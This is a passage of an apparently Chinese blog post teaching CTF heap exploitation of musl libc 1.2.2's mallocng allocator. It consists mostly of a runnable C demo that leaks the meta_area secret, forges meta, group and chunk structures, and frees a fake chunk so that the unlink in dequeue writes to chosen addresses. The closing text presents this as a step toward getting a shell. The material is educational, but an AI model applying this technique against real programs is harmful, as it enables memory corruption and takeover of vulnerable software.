class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> group* <span class="title function_">get_group</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)(chunk - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk[<span class="number">-4</span>])</span><br><span class="line">        offset = *(<span class="type">unsigned</span> <span class="type">int</span> *)(chunk - <span class="number">8</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> (<span class="type">void</span> *)(chunk - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> group_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta* <span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> get_group(chunk);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">meta_addr</span> =</span> group_addr-&gt;meta;</span><br><span class="line">    <span class="keyword">return</span> meta_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta_area* <span class="title function_">get_meta_area</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* meta)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta_area*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc中的unlink操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl libc版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;鉴于musl libc的轻量性，与其相关的利用方式也较为单一。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序所演示的unlink是最为常用的一种利用方式之一。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;musl libc与glibc不同，在主程序的main函数开始执行时，内存分配器就已经完成了初始化。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;请注意：在一个group中分配出来的chunk很可能在地址空间上不相邻。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因为一个group需要确保每个chunk都能够容纳该范围内最大的chunk。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此，调试便是musl libc赛题的重中之重。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是刚刚进入main函数时堆的情况：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;pwndbg&gt; mheap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;          secret : 0xd8e803bc461ae35a\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    mmap_counter : 0x0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      avail_meta : 0x55555555a0e0 (count: 96)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       free_meta : 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot; avail_meta_area : 0x55555555b000 (count: 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_head : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_tail : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       active[7] : 0x55555555a090 (mem: 0x555555558f40) -&gt; 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可见已经有一些meta被链入到链表数组之中了。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但这对做题的影响并不大，通过多次调试，我们就能够让自己的chunk进入想要的meta。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来让我们尝试分配几个chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc返回的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;\n接下来让我们用源码中给出的寻找chunk所在meta的方法回溯这些chunk所在的group和meta。\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">groups</span>[14];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">metas</span>[14];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        groups[i] = get_group(chunks[i]);</span><br><span class="line">        metas[i] = get_meta(chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc获得chunk的group地址和meta地址分别为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p %p\n\033[0m&quot;</span>, groups[i], metas[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过nontrivial_free中的dequeue函数进行unlink，首先要通过get_meta函数的重重检查：\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/meta.h, line 129)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static inline struct meta *get_meta(const unsigned char *p)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!((uintptr_t)p &amp; 15));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint offset = *(const uint16_t *)(p - 2);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint index = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (p[-4]) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(!offset);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\toffset = *(uint32_t *)(p - 8);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt; 0xffff);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta *meta = base-&gt;meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(meta-&gt;mem == base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(index &lt;= meta-&gt;last_idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(area-&gt;check == ctx.secret);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;sizeclass &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(meta-&gt;sizeclass == 63);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct meta *)meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面我们逐一查看一下这些检查的具体内容。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;1. meta-&gt;mem == base，即meta中保存的group指针要正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;2. index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。\n&quot;</span>);</span><br><span class="line">    printf_color(RED   , HIGHLIGHT, <span class="string">&quot;3. area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;4. offset &gt;= size_classes[meta-&gt;sizeclass]*index\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;5. offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;6. assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这些检查之中对我们最为重要的就是校验值的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只有泄露出secret值，我们才能释放伪造meta_area中伪造meta的group的chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">area</span> =</span> get_meta_area(metas[<span class="number">0</span>]);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面分配的所有meta均在同一个meta_area中，地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\n\033[0m&quot;</span>, area);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以由此获取到secret的值为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%#llx\n\n\033[0m&quot;</span>, area-&gt;check);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> secret = area-&gt;check;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们来伪造chunk以及其上的结构。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* mmap_space = mmap((<span class="type">void</span>*)<span class="number">0xdeadbeef000</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = <span class="number">7</span>;       <span class="comment">// group中保存的chunk大小，这里设置为0x80</span></span><br><span class="line">    fake_meta-&gt;last_idx = <span class="number">4</span>;        <span class="comment">// group中chunk的总数，这里设置为4表示chunk总数为5</span></span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;        <span class="comment">// 通过okay_to_free检查</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;    <span class="comment">// 通过检查1</span></span><br><span class="line">    fake_group-&gt;meta = fake_meta;   <span class="comment">// 使group能够找到meta</span></span><br><span class="line">    fake_meta-&gt;avail_mask = <span class="number">0b11101</span>;<span class="comment">// 使nontrivial_free进入if循环，得以执行dequeue</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_chunk = (<span class="type">char</span>*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span> + <span class="number">0x10</span> + <span class="number">0x80</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span> *)(fake_chunk - <span class="number">2</span>) = <span class="number">8</span>;    <span class="comment">// offset</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(fake_chunk - <span class="number">3</span>) = <span class="number">1</span>;      <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;绕过第1个检查，只需要设置meta中的group指针为假group指针即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第2个检查需要正确设置chunk的index值，本程序释放的是group中第2个chunk，因此索引为1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意索引值存放的位置，是chunk地址-3这个字节。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第3个检查需要我们提前泄露secret的值，并填写到meta_area中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;检查4和5只需要正确计算chunk的大小，填写chunk的索引值即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序尝试释放sizeclass=7的chunk，即chunk大小为0x80，因此第2个chunk的索引为0x80&gt;&gt;4=8。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;索引值index保存在chunk的前面两个字节中，正确填入即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;正确设置index后，检查6一般也是没有问题的。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在通过get_meta的检查后，还需要通过nontrivial_free中的if语句条件判断。\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 72)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo nontrivial_free(struct meta *g, int i)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t self = 1u&lt;&lt;i;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))\033[1;&quot;</span> PURPLE <span class="string">&quot;m &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// any multi-slot group is necessarily on an active list\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// here, but single-slot groups might or might not be.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (g-&gt;next) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tint activate_new = (ctx.active[sc]==g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tdequeue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\tactivate_group(ctx.active[sc]);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\treturn free_group(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else if (!mask) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// might still be active if there were no allocations\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// after last available slot was taken.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (ctx.active[sc] != g) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tqueue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\ta_or(&amp;g-&gt;freed_mask, self);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct mapinfo)&#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只需要修改meta中的freeable字段为1即可通过该检查。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后还需要在free_group中进入正确的else分支：\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 14)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo free_group(struct meta *g)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct mapinfo mi = &#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (sc &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (g-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstep_seq();\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\trecord_seq(sc);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.base = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.len = g-&gt;maplen*4096UL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tvoid *p = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstruct meta *m = get_meta(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tint idx = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tg-&gt;mem-&gt;meta = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi = nontrivial_free(m, idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfree_meta(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn mi;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这需要我们设置meta-&gt;maplen为非零值，防止再次进入nontrivial_free。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的maplen就设置为group占用的页数量即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们向meta的两个链表指针写入事先准备好的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;prev写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_1);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;next写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_2);</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = (<span class="keyword">struct</span> meta*)victim_1;</span><br><span class="line">    fake_meta-&gt;next = (<span class="keyword">struct</span> meta*)victim_2;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面调用free函数释放这个假chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;释放后，目标地址附近的值已经被成功修改：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim_1, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这证明使用一个假chunk修改两个地址的值是可行的，在free之后，chunk所在的页被释放了，这样就不会对接下来的进一步利用造成其他任何影响了。</p>
+<p>为了利用unlink，我们需要构造很多东西，不能落下其中任何一个，在解题与学习时要特别注意。在下一篇文章中笔者将会分析unlink如何与FILE结构体配合，从而最终getshell。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-1%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" rel="prev" title="数字逻辑 Chapter 1——基本知识">
+      <i class="fa fa-chevron-left"></i> 数字逻辑 Chapter 1——基本知识
+    </a></div>
+      <div class="post-nav-item">
